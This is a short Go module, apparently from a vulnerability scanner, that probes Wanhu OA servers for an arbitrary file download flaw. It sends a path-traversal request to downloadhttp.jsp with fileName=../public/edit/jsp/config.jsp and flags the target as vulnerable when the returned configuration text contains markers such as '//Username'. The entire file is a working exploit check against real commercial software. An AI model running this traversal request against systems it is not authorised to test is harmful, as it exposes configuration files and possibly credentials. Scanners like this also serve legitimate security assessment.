package wanhu_download_http

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(8 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)
	if err == nil && resp.StatusCode == 200 {
		body := resp.String()
		if strings.Contains(body, "//Username") || strings.Contains(body, "|||swf") || strings.Contains(body, "|||rar") {
			return true
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
		color.Green.Println("[+05] 万户OA downloadhttp.jsp 任意文件下载漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[+05] 万户OA downloadhttp.jsp 任意文件下载漏洞不存在")
	}

}
